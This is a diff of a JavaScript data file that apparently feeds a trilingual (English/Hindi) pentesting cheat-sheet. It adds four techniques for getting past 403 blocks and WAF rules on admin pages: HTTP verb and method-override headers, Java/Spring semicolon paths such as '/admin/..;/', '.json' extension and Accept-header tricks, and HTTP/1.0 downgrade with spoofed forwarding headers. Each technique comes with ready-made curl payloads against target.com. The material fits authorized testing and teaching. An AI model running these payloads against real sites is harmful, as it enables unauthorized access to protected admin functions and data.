@@ -475,6 +475,118 @@ https://target.com/admin?anything`,
       hi: "WAF सिर्फ रॉ टेक्स्ट पर रेगेक्स चलाता है। बैकएंड सर्वर WAF पास होने के बाद यूनिकोड को ओरिजिनल कैरेक्टर में डिकोड करता है।",
     },
   },
+  {
+    title: {
+      en: "HTTP Verb & Method Tampering Bypasses (HEAD, TRACE & Overrides)",
+      simple: "Change HTTP Method to Bypass 403",
+      hi: "HTTP मेथड व वर्ब टैम्परिंग (HEAD, TRACE व मेथड ओवरराइड)",
+    },
+    category: "path_tampering",
+    description: {
+      en: "Firewall Access Control Lists (ACLs) are frequently written as `<Limit GET>` in web server configurations. By switching the HTTP verb to `HEAD`, `POST`, or using method override headers, the restriction rule is completely bypassed while the server executes the route.",
+      simple: "Security filters only block GET requests. Changing the method to HEAD or POST can sneak past the block.",
+      hi: "सर्वर के सुरक्षा नियम अक्सर सिर्फ `GET` रिक्वेस्ट पर लगे होते हैं। जब आप मेथड को `HEAD`, `POST` या `X-HTTP-Method-Override` में बदलते हैं, तो नियम बाईपास हो जाता है।",
+    },
+    commandOrPayload: `# 1. Test HEAD method (often leaks Content-Length or full response headers):
+curl -i -X HEAD "https://target.com/admin"
+
+# 2. Test HTTP Method Overriding Headers:
+curl -s -X POST "https://target.com/admin" -H "X-HTTP-Method-Override: GET"
+curl -s -X POST "https://target.com/admin" -H "X-Method-Override: GET"
+curl -s -X POST "https://target.com/admin" -H "X-HTTP-Method: GET"
+
+# 3. Test arbitrary or uncommon HTTP verbs:
+curl -i -X TRACE "https://target.com/admin"
+curl -i -X OPTIONS "https://target.com/admin"
+curl -i -X JEFF "https://target.com/admin"`,
+    whyItWorks: {
+      en: "Apache and IIS `<Directory>` blocks often only restrict `GET` and `POST`. Frameworks like Ruby on Rails, Laravel, and Spring look at `X-HTTP-Method-Override` to resolve the internal controller route.",
+      simple: "Firewall rules only check the outer POST word, but web frameworks read the inner header to run the admin code.",
+      hi: "फायरवॉल सिर्फ बाहर के मेथड को देखता है, जबकि वेब फ्रेमवर्क अंदर के `X-HTTP-Method-Override` हेडर को पढ़कर एडमिन कोड रन कर देता है।",
+    },
+  },
+  {
+    title: {
+      en: "Spring Boot & Java Semicolon Matrix Traversal (/admin;, /admin/..;/)",
+      simple: "Java Semicolon Tricks for 403 Pages",
+      hi: "Spring Boot और Java सेमीकोलन मैट्रिक्स पाथ बाईपास",
+    },
+    category: "path_tampering",
+    description: {
+      en: "Java Servlets and Spring MVC support matrix parameters separated by semicolons (`;`). When an NGINX reverse proxy forwards traffic to Tomcat/Spring, NGINX evaluates `/admin;` as a distinct string (allowing it), but Spring strips the `;` and routes it directly to `@RequestMapping(\"/admin\")`.",
+      simple: "Adding a semicolon (;) fools the front proxy while the Java backend still opens the secret page.",
+      hi: "Java और Spring MVC में सेमीकोलन (`;`) मैट्रिक्स पैरामीटर माना जाता है। NGINX इसे अलग पाथ समझकर पास कर देता है, और Spring बैकएंड इसे सीधे `/admin` पर खोल देता है।",
+    },
+    commandOrPayload: `# Spring Boot and Java Servlet bypass permutations:
+curl -i "https://target.com/admin;"
+curl -i "https://target.com/admin;foo=bar"
+curl -i "https://target.com/admin/..;/"
+curl -i "https://target.com/api/v1/users/..;/admin"
+curl -i "https://target.com/error/..;/admin"
+curl -i "https://target.com/public/..;/admin"`,
+    whyItWorks: {
+      en: "Discrepancy in RFC 3986 path parsing: NGINX proxies treat `;` as a valid path character, while Tomcat and Spring MVC interpret it as matrix variable delimiters, normalizing `/admin;` down to `/admin`.",
+      simple: "NGINX sees /admin; as an allowed safe link, but Java strips the semicolon to access the admin portal.",
+      hi: "NGINX सेमीकोलन को नॉर्मल कैरेक्टर मानकर ब्लॉक नहीं करता, लेकिन Java बैकएंड सेमीकोलन को हटाकर एडमिन पोर्टल लोड कर देता है।",
+    },
+  },
+  {
+    title: {
+      en: "Extension Appending & Content Negotiation Bypasses (.json, Accept Header)",
+      simple: "Add .json or .html to 403 Links",
+      hi: "एक्सटेंशन जोड़ना (.json) और Accept हेडर बाईपास",
+    },
+    category: "path_tampering",
+    description: {
+      en: "Access controls often restrict the raw endpoint `/admin`, but fail to guard extension-suffixed routes or API formats. Appending `.json`, `.html`, or tampering the `Accept` header triggers alternative controller serializers that bypass auth middleware.",
+      simple: "Append .json to the end of a forbidden link to get raw data directly from the server.",
+      hi: "सुरक्षा नियम अक्सर सिर्फ `/admin` पर लगे होते हैं। जब आप `/admin.json` या `/api/users.json` रिक्वेस्ट करते हैं, तो डेटा बिना ब्लॉक हुए JSON में वापस आ जाता है।",
+    },
+    commandOrPayload: `# 1. Test extension appends:
+curl -i "https://target.com/admin.json"
+curl -i "https://target.com/admin.html"
+curl -i "https://target.com/admin.xml"
+curl -i "https://target.com/admin.php"
+
+# 2. Content Negotiation Header Tampering:
+curl -i "https://target.com/admin" -H "Accept: application/json, text/plain, */*"
+curl -i "https://target.com/admin" -H "Accept: application/xml"`,
+    whyItWorks: {
+      en: "Modern frameworks like Rails and Django use format suffixes (`/admin.json`) for REST responses. WAF regexes matching strictly `^/admin$` fail to match `.json`, but the controller happily returns the data.",
+      simple: "Firewall rules look for exact /admin path. Adding .json tricks the firewall while the website responds with data.",
+      hi: "WAF नियम सिर्फ `/admin` शब्द पर नज़र रखते हैं। जब आप `.json` लगाते हैं, तो WAF मैच नहीं कर पाता लेकिन बैकएंड सारा डेटा डंप कर देता है।",
+    },
+  },
+  {
+    title: {
+      en: "Protocol Downgrade & Internal Port Smuggling (HTTP/1.0 & Fake Hops)",
+      simple: "HTTP/1.0 Downgrade and Internal Ports",
+      hi: "HTTP/1.0 प्रोटोकॉल डाउनग्रेड और इंटरनल पोर्ट बाईपास",
+    },
+    category: "header_bypass",
+    description: {
+      en: "HTTP/1.0 does not require Host headers and frequently bypasses proxy caching and strict reverse proxy rule evaluation. Combined with port headers (`X-Forwarded-Port: 443`), it tricks the server into thinking the request originated from an already-validated internal TLS termination proxy.",
+      simple: "Send old HTTP/1.0 requests or tell the server you are on the secure internal port.",
+      hi: "HTTP/1.0 प्रोटोकॉल में कई आधुनिक WAF नियम काम नहीं करते। `X-Forwarded-Port: 443` हेडर के साथ भेजने पर सर्वर समझता है कि यह पहले से वेरिफाइड इंटरनल ट्रैफिक है।",
+    },
+    commandOrPayload: `# 1. HTTP/1.0 Downgrade via Netcat or cURL:
+curl -i --http1.0 "https://target.com/admin"
+
+# 2. Internal TLS Termination and Port Headers:
+X-Forwarded-Port: 443
+X-Forwarded-Proto: https
+X-Forwarded-Scheme: https
+X-Forwarded-Ssl: on
+Front-End-Https: on
+
+# 3. RFC 7239 Standard Forwarded Header:
+Forwarded: for=127.0.0.1;proto=https;by=127.0.0.1`,
+    whyItWorks: {
+      en: "Load balancers strip SSL and pass plain HTTP traffic internally with `X-Forwarded-Proto: https` or `Front-End-Https: on`. Emulating these headers satisfies backend checks that verify if TLS termination already took place.",
+      simple: "Tells the backend server that the front security scanner has already approved and encrypted this request.",
+      hi: "लोड बैलेंसर इंटरनल सर्वर्स को `X-Forwarded-Proto: https` हेडर भेजते हैं। इसे खुद इंजेक्ट करने पर बैकएंड समझता है कि लोड बैलेंसर ने इसे पहले ही चेक कर लिया है।",
+    },
+  },
 ];
 
 // ── 3. ELITE RECON TERMINAL ONE-LINERS ───────────────────────────────────────
